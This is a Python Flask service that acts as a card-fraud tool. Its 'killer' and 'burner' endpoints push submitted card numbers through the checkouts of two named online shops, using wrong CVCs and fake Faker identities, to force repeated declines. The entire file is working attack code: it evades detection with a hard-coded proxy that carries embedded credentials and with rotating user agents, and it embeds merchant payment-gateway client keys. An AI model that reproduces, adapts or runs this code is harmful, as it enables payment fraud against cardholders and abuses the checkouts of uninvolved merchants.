import asyncio
import random
import os
import json
import time
import hashlib
import aiohttp
from faker import Faker
import urllib.parse
from flask import Flask, jsonify, request
from user_agent import generate_user_agent
import uuid
import re
import ssl

# Global maintenance status
MAINTENANCE_STATUS = {
    "killer": False,
    "burner": False
}

# Proxy configuration
PROXY = "http://sf30p9orymc24y0:47h00f3br44ezpw@rp.scrapegw.com:6060"

async def get_usa_address():
    fake = Faker('en_US')
    full_name = fake.name().split()
    first_name = full_name[0]
    last_name = " ".join(full_name[1:]) if len(full_name) > 1 else ""
    email_username = first_name.lower() + last_name.replace(" ", "").lower() + str(random.randint(100, 999))
    email = f"{email_username}@gmail.com"
    
    # Random phone number (US format)
    phone = f"{random.randint(200, 999)}{random.randint(200, 999)}{random.randint(1000, 9999)}"
    
    # Random city and state
    city = fake.city()
    state = fake.state_abbr()
    
    # Random zip code based on state
    zip_code = fake.zipcode_in_state(state)
    
    address = {
        "first_name": first_name,
        "last_name": last_name,
        "address_line1": fake.street_address(),
        "city": city,
        "state": state,
        "zip": zip_code,
        "email": email,
        "phone": phone
    }
    return address

def get_number(exclude):
    numbers = [i for i in range(100, 1000) if i != exclude]
    return str(random.choice(numbers))

def generate_random_id():
    """Generate random UUID for tokenization"""
    return str(uuid.uuid4())

def get_random_user_agent():
    """Generate random user agent for each request"""
    return generate_user_agent()

def generate_cart_key():
    """Generate a random cart key that matches WooCommerce format"""
    random_string = f"{time.time()}{random.randint(1000, 9999)}"
    return hashlib.md5(random_string.encode()).hexdigest()[:32]

def extract_cart_info(cookies):
    """Extract cart hash and key from cookies, generate if not found"""
    cookies_dict = {cookie.key: cookie.value for cookie in cookies}
    
    # Try to extract cart hash
    cart_hash = cookies_dict.get('woocommerce_cart_hash')
    if cart_hash:
        print(f"[ + ] Cart Hash from cookies: {cart_hash}")
    else:
        print("[ - ] Cart hash not found in cookies")
        cart_hash = None
    
    # Try to extract cart key from session cookie
    cart_key = None
    for cookie_name, cookie_value in cookies_dict.items():
        if 'woocommerce_session' in cookie_name:
            try:
                # Session cookie format: t_hash|expiry|data
                session_parts = cookie_value.split('|')
                if len(session_parts) >= 3:
                    cart_key = session_parts[0]
                    print(f"[ + ] Cart key from session: {cart_key}")
                    break
            except:
                continue
    
    # If no cart key found, generate one
    if not cart_key:
        cart_key = generate_cart_key()
        print(f"[ + ] Generated cart key: {cart_key}")
    
    return cart_hash, cart_key

def extract_checkout_nonce(html_text, gateway_name):
    """Extract only the woocommerce-process-checkout-nonce from HTML"""
    try:
        # Method 1: Direct string search
        if 'woocommerce-process-checkout-nonce' in html_text:
            value_part = html_text.split('"woocommerce-process-checkout-nonce" value="')[1].split('"')[0]
            return value_part 
        else:
            print(f"[ - ] {gateway_name} - Checkout nonce not found in HTML")
            return None
        
    except Exception as e:
        print(f"[ - ] {gateway_name} - Nonce extraction error: {e}")
        return None

async def kill_gateway(cc: str):
    """Killer Gateway - Processes card for declines on drinkfable.com"""
    num, mm, yy, cvc = cc.split("|")
    address = await get_usa_address()
    fn = address['first_name']
    ln = address['last_name']
    add = address['address_line1']
    email = address['email']
    phone = address['phone']
    city = urllib.parse.quote(address['city'])
    state = address['state']
    zip_code = address['zip']
    
    en_street = add.replace(' ', '+')
    en_email = urllib.parse.quote(email)
    
    if not num.startswith('4'):
        return {
            "status": "failure", 
            "message": "Only Visa Card Allowed",
            "for_loop_count": 0,
            "declined_count": 0,
            "gateway": "killer"
        }
    
    if "20" not in yy:
        yy = f"20{yy}"
    yy1 = yy[2:]
    
    # Generate random user agent for the session
    user = get_random_user_agent()
    user2 = urllib.parse.quote_plus(user)
    session_start_time = time.strftime(
        "%Y-%m-%d+%H%%3A%M%%3A%S",
        time.gmtime(time.time() - 120)
    )
    
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=60)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            
            # FIRST REQUEST - Add to cart (drinkfable.com)
            print("[ + ] Killer Gateway - Adding item to cart...")
            headers = {
                'authority': 'drinkfable.com',
                'accept': '*/*',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://drinkfable.com',
                'referer': 'https://drinkfable.com/shop/fable-into-the-woods-cocktail/',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }
            
            data = 'attribute_pack-size=24+pack&attribute_potency=10mg+THC+%26+5mg+CBD+per+can&subscribe-to-action-input=no&convert_to_sub_dropdown1395=2_week&convert_to_sub_1395=0&quantity=1&add-to-cart=1395&product_id=1395&variation_id=8738&action=etheme_ajax_add_to_cart'
            
            async with session.post(
                'https://drinkfable.com/wp-admin/admin-ajax.php',
                headers=headers,
                data=data,
                proxy=PROXY
            ) as response:
                if response.status == 200:
                    print("[ + ] Killer Gateway - Item Added to Cart")
                    
                else:
                    print(f"[ - ] Killer Gateway - Failed to Add Product: {response.status}")
                    return {
                        "status": "failure",
                        "message": "Failed to Add Product",
                        "for_loop_count": 0,
                        "declined_count": 0,
                        "gateway": "killer"
                    }
            
            # SECOND REQUEST - Checkout page (drinkfable.com)
            print("[ + ] Killer Gateway - Loading checkout page...")
            headers = {
                'authority': 'drinkfable.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'referer': 'https://drinkfable.com/shop/fable-into-the-woods-cocktail/',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user,
            }
            
            async with session.get('https://drinkfable.com/checkout/', headers=headers, proxy=PROXY) as response:
                if response.status == 200:
                    print("[ + ] Killer Gateway - Checkout Page Loaded")
                    text = await response.text()
                    
                    # Extract checkout nonce only
                    cpn = extract_checkout_nonce(text, "Killer Gateway")
                    if not cpn:
                        print("[ - ] Killer Gateway - Checkout nonce not found")
                        return {
                            "status": "failure",
                            "message": "Checkout nonce not found",
                            "for_loop_count": 0,
                            "declined_count": 0,
                            "gateway": "killer"
                        }
                    print(f"[ + ] Killer Gateway - Checkout Processing Nonce: {cpn}")
                else:
                    print(f"[ - ] Killer Gateway - Checkout Page Couldn't Be Loaded: {response.status}")
                    return {
                        "status": "failure",
                        "message": "Checkout Page Couldn't Be Loaded",
                        "for_loop_count": 0,
                        "declined_count": 0,
                        "gateway": "killer"
                    }
            
            # Extract cart info from cookies
            cart_hash, cart_key = extract_cart_info(session.cookie_jar)
            
            # RANDOM LOOP: 5 or 6 attempts
            loop_count = random.randint(5, 6)
            print(f"[ + ] Killer Gateway - Starting {loop_count} processing attempts...")
            
            # Track results
            results = {
                "success": 0,
                "declined": 0,
                "failed": 0,
                "attempts": []
            }
            
            for attempt in range(loop_count):
                print(f"[ + ] Killer Gateway - Attempt {attempt + 1}/{loop_count}")
                
                # Generate new random ID for each tokenization attempt
                token_id = generate_random_id()
                
                # THIRD REQUEST - Card tokenization (drinkfable.com)
                print(f"[ + ] Killer Gateway - Attempt {attempt + 1}: Tokenizing card...")
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Origin': 'https://drinkfable.com',
                    'Referer': 'https://drinkfable.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': user,
                    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Android"',
                }
                
                json_data = {
                    'securePaymentContainerRequest': {
                        'merchantAuthentication': {
                            'name': '8Fmh5f3Cd',
                            'clientKey': '948BjN64UyEMJ73HVJwFCed4Sr2262rV9jSZ67ZU7JHB9zzJvspscbb6bCf43vWM',
                        },
                        'data': {
                            'type': 'TOKEN',
                            'id': token_id,
                            'token': {
                                'cardNumber': num,
                                'expirationDate': f'{mm}{yy1}',
                                'cardCode': str(get_number(int(cvc))),
                                'zip': '10080',
                                'fullName': f'{fn} {ln}',
                            },
                        },
                    },
                }
                
                async with session.post(
                    'https://api2.authorize.net/xml/v1/request.api',
                    headers=headers,
                    json=json_data,
                ) as response:
                    if response.status == 200:
                        print(f"[ + ] Killer Gateway - Attempt {attempt + 1}: Card Tokenization Completed")
                        
                        # Get response text first to handle BOM
                        response_text = await response.text()
                        
                        # Handle UTF-8 BOM by stripping it if present
                        if response_text.startswith('\ufeff'):
                            response_text = response_text[1:]
                        
                        try:
                            # Try to parse as JSON
                            cardtoken_data = json.loads(response_text)
                        except:
                            # If JSON parsing fails, extract manually
                            cardtoken_data = {}
                        
                        if 'opaqueData' in cardtoken_data:
                            cardtoken_value = cardtoken_data['opaqueData']['dataValue']
                            cardtoken_descriptor = cardtoken_data['opaqueData']['dataDescriptor']
                        else:
                            # Manual extraction from response text
                            cardtoken_value = response_text.split('"dataValue":"')[1].split('"')[0] if '"dataValue":"' in response_text else None
                            cardtoken_descriptor = "COMMON.ACCEPT.INAPP.PAYMENT"
                        
                        if cardtoken_value:
                            print(f"[ + ] Killer Gateway - Attempt {attempt + 1}: Card Token Extraction Successful")
                        else:
                            print(f"[ - ] Killer Gateway - Attempt {attempt + 1}: Card Token Extraction Failed!")
                            results["failed"] += 1
                            results["attempts"].append({"attempt": attempt + 1, "status": "token_failed"})
                            continue
                    else:
                        print(f"[ - ] Killer Gateway - Attempt {attempt + 1}: Card Tokenization Failed!")
                        results["failed"] += 1
                        results["attempts"].append({"attempt": attempt + 1, "status": "token_failed"})
                        continue
                
                # FOURTH REQUEST - Final checkout (drinkfable.com)
                print(f"[ + ] Killer Gateway - Attempt {attempt + 1}: Processing checkout...")
                headers = {
                    'authority': 'drinkfable.com',
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://drinkfable.com',
                    'referer': 'https://drinkfable.com/checkout/',
                    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': user,
                    'x-requested-with': 'XMLHttpRequest',
                }
                
                # After getting USA address, override with New York details:
                city = "New+York"
                state = "NY" 
                zip_code = "10080"
                
                data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fdrinkfable.com%2F&wc_order_attribution_session_start_time={session_start_time}&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user2}&billing_first_name={fn}&billing_last_name={ln}&billing_country=US&billing_address_1={en_street}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={en_email}&shipping_first_name={fn}&shipping_last_name={ln}&shipping_country=US&shipping_address_1={en_street}&shipping_address_2=&shipping_city={city}&shipping_state={state}&shipping_postcode={zip_code}&shipping_phone={phone}&order_comments=&shipping_method%5B0%5D=free_shipping%3A3&payment_method=authorize_net_cim_credit_card&wc-authorize-net-cim-credit-card-context=shortcode&wc-authorize-net-cim-credit-card-expiry={mm}+%2F+{yy1}&wc-authorize-net-cim-credit-card-payment-nonce={cardtoken_value}&wc-authorize-net-cim-credit-card-payment-descriptor={cardtoken_descriptor}&wc-authorize-net-cim-credit-card-last-four={num[-4:]}&wc-authorize-net-cim-credit-card-card-type=visa&terms=on&terms-field=1&woocommerce-process-checkout-nonce={cpn}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&cart%5B{cart_key}%5D%5Bqty%5D=1'
                
                async with session.post(
                    'https://drinkfable.com/?wc-ajax=checkout',
                    headers=headers,
                    data=data,
                    proxy=PROXY
                ) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # CORRECT LOGIC: DECLINE = SUCCESS, SUCCESS = FAILURE
                        if "declined" in response_text.lower():
                            print(f"[ ✅ ] Killer Gateway - Attempt {attempt + 1}: CC DECLINED - SUCCESS!")
                            results["declined"] += 1
                            results["attempts"].append({"attempt": attempt + 1, "status": "declined"})
                            
                            # If we have declines and this is the last attempt, consider it success
                            if (attempt + 1) == loop_count and results["declined"] > 0:
                                print(f"[ 🎯 ] Killer Gateway - FINAL SUCCESS: Got {results['declined']} declines out of {loop_count} attempts")
                                return {
                                    "status": "success", 
                                    "message": f"Got {results['declined']} declines",
                                    "results": results,
                                    "for_loop_count": loop_count,
                                    "declined_count": results["declined"],
                                    "gateway": "killer"
                                }
                            else:
                                await asyncio.sleep(1)
                                continue
                                
                        # Check for SUCCESS (which is failure for us)
                        elif any(keyword in response_text.lower() for keyword in ['success', 'thank you', 'order received', 'order number']):
                            print(f"[ ❌ ] Killer Gateway - Attempt {attempt + 1}: CC PROCESSED SUCCESSFULLY - FAILURE!")
                            results["success"] += 1
                            results["attempts"].append({"attempt": attempt + 1, "status": "success"})
                            
                            # Stop processing if we get a success after declines (Partial Success)
                            if results["declined"] > 0:
                                print(f"[ ⚠️ ] Killer Gateway - PARTIAL SUCCESS: Got success after {results['declined']} declines")
                                return {
                                    "status": "partial_success", 
                                    "message": f"Success after {results['declined']} declines",
                                    "results": results,
                                    "for_loop_count": loop_count,
                                    "declined_count": results["declined"],
                                    "gateway": "killer"
                                }
                            # If all attempts are successful, consider it failure
                            elif (attempt + 1) == loop_count and results["success"] == loop_count:
                                print(f"[ 💥 ] Killer Gateway - COMPLETE FAILURE: All {loop_count} attempts were successful")
                                return {
                                    "status": "failure",
                                    "message": f"All {loop_count} attempts were successful",
                                    "results": results,
                                    "for_loop_count": loop_count,
                                    "declined_count": results["declined"],
                                    "gateway": "killer"
                                }
                            else:
                                # Continue to see if we get declines
                                await asyncio.sleep(1)
                                continue
                        else:
                            print(f"[ - ] Killer Gateway - Attempt {attempt + 1}: CC Processing Failed - Unknown response")
                            results["failed"] += 1
                            results["attempts"].append({"attempt": attempt + 1, "status": "failed"})
                            await asyncio.sleep(1)
                            continue
                    else:
                        print(f"[ - ] Killer Gateway - Attempt {attempt + 1}: CC Processing Failed - HTTP {response.status}")
                        results["failed"] += 1
                        results["attempts"].append({"attempt": attempt + 1, "status": "http_error"})
                        await asyncio.sleep(1)
                        continue
            
            # Final evaluation after all attempts
            if results["declined"] > 0:
                print(f"[ ✅ ] Killer Gateway - FINAL SUCCESS: Got {results['declined']} declines")
                return {
                    "status": "success",
                    "message": f"Got {results['declined']} declines out of {loop_count} attempts",
                    "results": results,
                    "for_loop_count": loop_count,
                    "declined_count": results["declined"],
                    "gateway": "killer"
                }
            else:
                print(f"[ ❌ ] Killer Gateway - FINAL FAILURE: No declines detected")
                return {
                    "status": "failure",
                    "message": "No declines detected in any attempt",
                    "results": results,
                    "for_loop_count": loop_count,
                    "declined_count": results["declined"],
                    "gateway": "killer"
                }
            
    except Exception as e:
        print(f"[ 💥 ] Killer Gateway Exception: {str(e)}")
        return {
            "status": "failure", 
            "message": f"Exception: {str(e)}",
            "for_loop_count": 0,
            "declined_count": 0,
            "gateway": "killer"
        }

async def burn_gateway(cc: str):
    num, mm, yy, cvc = cc.split("|")
    address = await get_usa_address()
    fn = address['first_name']
    ln = address['last_name']
    add = address['address_line1']
    email = address['email']
    phone = address['phone']
    city = urllib.parse.quote(address['city'])
    state = address['state']
    zip_code = address['zip']
    
    en_street = add.replace(' ', '+')
    en_email = urllib.parse.quote(email)
    
    if not num.startswith('4'):
        return {
            "status": "failure", 
            "message": "Only Visa Card Allowed",
            "for_loop_count": 0,
            "declined_count": 0,
            "gateway": "burner"
        }
    
    if "20" not in yy:
        yy = f"20{yy}"
    yy1 = yy[2:]
    
    user = get_random_user_agent()
    user2 = urllib.parse.quote_plus(user)
    session_start_time = time.strftime(
        "%Y-%m-%d+%H%%3A%M%%3A%S",
        time.gmtime(time.time() - 120)
    )
    
    try:
        connector = aiohttp.TCPConnector(limit=10)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(
            connector=connector, 
            timeout=timeout
        ) as session:
            
            # FIRST REQUEST - Add to cart (NEW PRODUCT)
            print("[ + ] Burn Gateway - Adding item to cart...")
            headers = {
                'Accept': '*/*',
                'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://stanzadeals.com',
                'Referer': 'https://stanzadeals.com/books/history-and-philosophy-of-sport-and-physical-activity/',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest',
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
            }
            
            # NEW PRODUCT DATA
            data = 'attribute_pa_condition=new&quantity=1&add-to-cart=16068&product_id=16068&variation_id=16355'
            
            async with session.post(
                'https://stanzadeals.com/books/history-and-philosophy-of-sport-and-physical-activity/',
                headers=headers,
                data=data,
                proxy=PROXY
            ) as response:
                if response.status == 200:
                    print("[ + ] Burn Gateway - Item Added to Cart")
                else:
                    print(f"[ - ] Burn Gateway - Failed to Add Product: {response.status}")
                    return {
                        "status": "failure",
                        "message": "Failed to Add Product",
                        "for_loop_count": 0,
                        "declined_count": 0,
                        "gateway": "burner"
                    }
            
            # SECOND REQUEST - Checkout page
            print("[ + ] Burn Gateway - Loading checkout page...")
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'Referer': 'https://stanzadeals.com/cart/',
                'User-Agent': user,
                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Android"',
            }
            
            async with session.get('https://stanzadeals.com/checkout/', headers=headers, proxy=PROXY) as response:
                if response.status == 200:
                    print("[ + ] Burn Gateway - Checkout Page Loaded")
                    text = await response.text()
                    
                    cpn = extract_checkout_nonce(text, "Burn Gateway")
                    if not cpn:
                        print("[ - ] Burn Gateway - Checkout nonce not found")
                        return {
                            "status": "failure",
                            "message": "Checkout nonce not found",
                            "for_loop_count": 0,
                            "declined_count": 0,
                            "gateway": "burner"
                        }
                else:
                    print(f"[ - ] Burn Gateway - Checkout Page Couldn't Be Loaded: {response.status}")
                    return {
                        "status": "failure",
                        "message": "Checkout Page Couldn't Be Loaded",
                        "for_loop_count": 0,
                        "declined_count": 0,
                        "gateway": "burner"
                    }
            
            # RANDOM LOOP: 5 or 6 attempts
            loop_count = random.randint(5, 6)
            print(f"[ + ] Burn Gateway - Starting {loop_count} processing attempts...")
            
            # Track results
            results = {
                "success": 0,
                "declined": 0,
                "failed": 0,
                "attempts": []
            }
            
            for attempt in range(loop_count):
                print(f"[ + ] Burn Gateway - Attempt {attempt + 1}/{loop_count}")
                
                token_id = generate_random_id()
                
                # THIRD REQUEST - Card tokenization (DIRECT - NO PROXY)
                print(f"[ + ] Burn Gateway - Attempt {attempt + 1}: Tokenizing card...")
                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Content-Type': 'application/json; charset=UTF-8',
                    'Origin': 'https://stanzadeals.com',
                    'Referer': 'https://stanzadeals.com/',
                    'User-Agent': user,
                    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Android"',
                }
                
                json_data = {
                    'securePaymentContainerRequest': {
                        'merchantAuthentication': {
                            'name': '2eGEv626',
                            'clientKey': '8f5F4SrsvaGbnb73CXTrbsH34a3vYxKCWeZAM5766PN4a7g4888yNSMfakLqd8BK',
                        },
                        'data': {
                            'type': 'TOKEN',
                            'id': token_id,
                            'token': {
                                'cardNumber': num,
                                'expirationDate': f'{mm}{yy1}',
                                'cardCode': str(get_number(int(cvc))),
                                'fullName': f'{fn} {ln}',
                            },
                        },
                    },
                }
                
                # Tokenization WITHOUT PROXY
                try:
                    async with session.post(
                        'https://api2.authorize.net/xml/v1/request.api',
                        headers=headers,
                        json=json_data
                    ) as response:
                        if response.status == 200:
                            print(f"[ + ] Burn Gateway - Attempt {attempt + 1}: Card Tokenization Completed")
                            
                            response_text = await response.text()
                            
                            if response_text.startswith('\ufeff'):
                                response_text = response_text[1:]
                            
                            try:
                                cardtoken_data = json.loads(response_text)
                            except:
                                cardtoken_data = {}
                            
                            if 'opaqueData' in cardtoken_data:
                                cardtoken_value = cardtoken_data['opaqueData']['dataValue']
                                cardtoken_descriptor = cardtoken_data['opaqueData']['dataDescriptor']
                            else:
                                cardtoken_value = response_text.split('"dataValue":"')[1].split('"')[0] if '"dataValue":"' in response_text else None
                                cardtoken_descriptor = "COMMON.ACCEPT.INAPP.PAYMENT"
                            
                            if cardtoken_value:
                                print(f"[ + ] Burn Gateway - Attempt {attempt + 1}: Card Token Extraction Successful")
                            else:
                                print(f"[ - ] Burn Gateway - Attempt {attempt + 1}: Card Token Extraction Failed!")
                                results["failed"] += 1
                                results["attempts"].append({"attempt": attempt + 1, "status": "token_failed"})
                                continue
                        else:
                            print(f"[ - ] Burn Gateway - Attempt {attempt + 1}: Card Tokenization Failed!")
                            results["failed"] += 1
                            results["attempts"].append({"attempt": attempt + 1, "status": "token_failed"})
                            continue
                            
                except Exception as e:
                    print(f"[ - ] Burn Gateway - Attempt {attempt + 1}: Tokenization Error: {e}")
                    results["failed"] += 1
                    results["attempts"].append({"attempt": attempt + 1, "status": "token_error"})
                    continue
                
                # FOURTH REQUEST - Final checkout (WITH PROXY)
                print(f"[ + ] Burn Gateway - Attempt {attempt + 1}: Processing checkout...")
                headers = {
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://stanzadeals.com',
                    'Referer': 'https://stanzadeals.com/checkout/',
                    'User-Agent': user,
                    'X-Requested-With': 'XMLHttpRequest',
                    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Android"',
                }
                
                # SIMPLIFIED CHECKOUT DATA (based on your curl)
                data = f'billing_first_name={fn}&billing_last_name={ln}&billing_country=US&billing_address_1={en_street}&billing_city=NY&billing_state=NY&billing_postcode=10080&billing_phone={phone}&billing_email={en_email}&shipping_first_name={fn}&shipping_last_name={ln}&shipping_country=US&shipping_address_1={en_street}&shipping_city=NY&shipping_state=NY&shipping_postcode=10080&shipping_phone={phone}&shipping_method%5B0%5D=free_shipping%3A6&payment_method=authnet&terms=on&terms-field=1&woocommerce-process-checkout-nonce={cpn}&authnet_nonce={cardtoken_value}&authnet_data_descriptor={cardtoken_descriptor}'
                
                async with session.post(
                    'https://stanzadeals.com/?wc-ajax=checkout',
                    headers=headers,
                    data=data,
                    proxy=PROXY
                ) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        print(f"[ + ] Burn Gateway - Attempt {attempt + 1}: Checkout Response Received")
                        
                        # Check for DECLINE (SUCCESS for us)
                        if "declined" in response_text.lower():
                            print(f"[ ✅ ] Burn Gateway - Attempt {attempt + 1}: CC DECLINED - SUCCESS!")
                            results["declined"] += 1
                            results["attempts"].append({"attempt": attempt + 1, "status": "declined"})
                            
                            if (attempt + 1) == loop_count and results["declined"] > 0:
                                print(f"[ 🎯 ] Burn Gateway - FINAL SUCCESS: Got {results['declined']} declines out of {loop_count} attempts")
                                return {
                                    "status": "success", 
                                    "message": f"Got {results['declined']} declines",
                                    "results": results,
                                    "for_loop_count": loop_count,
                                    "declined_count": results["declined"],
                                    "gateway": "burner"
                                }
                            else:
                                await asyncio.sleep(1)
                                continue
                                
                        # Check for SUCCESS (FAILURE for us)
                        elif any(keyword in response_text.lower() for keyword in ['success', 'thank you', 'order received', 'order number']):
                            print(f"[ ❌ ] Burn Gateway - Attempt {attempt + 1}: CC PROCESSED SUCCESSFULLY - FAILURE!")
                            results["success"] += 1
                            results["attempts"].append({"attempt": attempt + 1, "status": "success"})
                            
                            if results["declined"] > 0:
                                print(f"[ ⚠️ ] Burn Gateway - PARTIAL SUCCESS: Got success after {results['declined']} declines")
                                return {
                                    "status": "partial_success", 
                                    "message": f"Success after {results['declined']} declines",
                                    "results": results,
                                    "for_loop_count": loop_count,
                                    "declined_count": results["declined"],
                                    "gateway": "burner"
                                }
                            elif (attempt + 1) == loop_count and results["success"] == loop_count:
                                print(f"[ 💥 ] Burn Gateway - COMPLETE FAILURE: All {loop_count} attempts were successful")
                                return {
                                    "status": "failure",
                                    "message": f"All {loop_count} attempts were successful",
                                    "results": results,
                                    "for_loop_count": loop_count,
                                    "declined_count": results["declined"],
                                    "gateway": "burner"
                                }
                            else:
                                await asyncio.sleep(1)
                                continue
                        else:
                            print(f"[ - ] Burn Gateway - Attempt {attempt + 1}: CC Processing Failed - Unknown response")
                            results["failed"] += 1
                            results["attempts"].append({"attempt": attempt + 1, "status": "failed"})
                            await asyncio.sleep(1)
                            continue
                    else:
                        print(f"[ - ] Burn Gateway - Attempt {attempt + 1}: CC Processing Failed - HTTP {response.status}")
                        results["failed"] += 1
                        results["attempts"].append({"attempt": attempt + 1, "status": "http_error"})
                        await asyncio.sleep(1)
                        continue
            
            if results["declined"] > 0:
                print(f"[ ✅ ] Burn Gateway - FINAL SUCCESS: Got {results['declined']} declines")
                return {
                    "status": "success",
                    "message": f"Got {results['declined']} declines out of {loop_count} attempts",
                    "results": results,
                    "for_loop_count": loop_count,
                    "declined_count": results["declined"],
                    "gateway": "burner"
                }
            else:
                print(f"[ ❌ ] Burn Gateway - FINAL FAILURE: No declines detected")
                return {
                    "status": "failure",
                    "message": "No declines detected in any attempt",
                    "results": results,
                    "for_loop_count": loop_count,
                    "declined_count": results["declined"],
                    "gateway": "burner"
                }
            
    except Exception as e:
        print(f"[ 💥 ] Burn Gateway Exception: {str(e)}")
        return {
            "status": "failure", 
            "message": f"Exception: {str(e)}",
            "for_loop_count": 0,
            "declined_count": 0,
            "gateway": "burner"
        }

app = Flask(__name__)
VALID_KEY = "ayushanddark"

def run_async(coro):
    """Run async function in sync context"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/')
def root():
    return jsonify({"message": "Unified CC Processor API is running"})

# KILLER GATEWAY - ACTIVE
@app.route('/gateway=killer/key=<key>/cc=<cc>')
def process_kill(key, cc):
    if key != VALID_KEY:
        return jsonify({"error": "Invalid authentication key"}), 401
    
    # Check maintenance status
    if MAINTENANCE_STATUS["killer"]:
        return jsonify({
            "status": "maintenance",
            "message": "Kill gate is under maintenance",
            "for_loop_count": 0,
            "declined_count": 0,
            "gateway": "killer"
        }), 503
    
    if not cc or "|" not in cc:
        return jsonify({"error": "Invalid CC format. Use: num|mm|yy|cvc"}), 400
    
    try:
        result = run_async(kill_gateway(cc))
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": f"Processing error: {str(e)}"}), 500

# BURNER GATEWAY - ACTIVE
@app.route('/gateway=burner/key=<key>/cc=<cc>')
def process_burn(key, cc):
    if key != VALID_KEY:
        return jsonify({"error": "Invalid authentication key"}), 401
    
    # Check maintenance status
    if MAINTENANCE_STATUS["burner"]:
        return jsonify({
            "status": "maintenance",
            "message": "Burn gate is under maintenance",
            "for_loop_count": 0,
            "declined_count": 0,
            "gateway": "burner"
        }), 503
    
    if not cc or "|" not in cc:
        return jsonify({"error": "Invalid CC format. Use: num|mm|yy|cvc"}), 400
    
    try:
        result = run_async(burn_gateway(cc))
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": f"Processing error: {str(e)}"}), 500

# HEALTH ENDPOINTS
@app.route('/gateway=killer/health')
def health_kill():
    if MAINTENANCE_STATUS["killer"]:
        return jsonify({
            "status": "maintenance", 
            "service": "Kill Gateway",
            "message": "Gate is under maintenance"
        })
    return jsonify({"status": "healthy", "service": "Kill Gateway"})

@app.route('/gateway=burner/health')
def health_burn():
    if MAINTENANCE_STATUS["burner"]:
        return jsonify({
            "status": "maintenance", 
            "service": "Burn Gateway",
            "message": "Gate is under maintenance"
        })
    return jsonify({"status": "healthy", "service": "Burn Gateway"})

